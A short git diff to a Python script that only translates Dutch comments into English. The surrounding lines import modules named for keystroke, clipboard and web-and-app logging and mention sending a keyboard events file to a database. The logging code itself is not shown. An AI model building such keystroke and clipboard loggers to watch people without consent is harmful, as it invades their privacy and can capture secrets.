@@ -5,7 +5,7 @@
 #               - Keano (03-04-2023)                                                                                   #
 ########################################################################################################################
 
-# Hier alle library imports
+# Library imports here
 import web_and_app_info_logger
 import keystrokes_and_clipboard_logger
 import os
@@ -13,7 +13,7 @@ import datetime
 import keyboard as kb
 
 event_string = ''
-# Hieronder de relevante code
+# Main code here
 def main():
     if os.path.isfile("keyboard_events.txt"):
         # Code voor versturen van het bestand naar DB
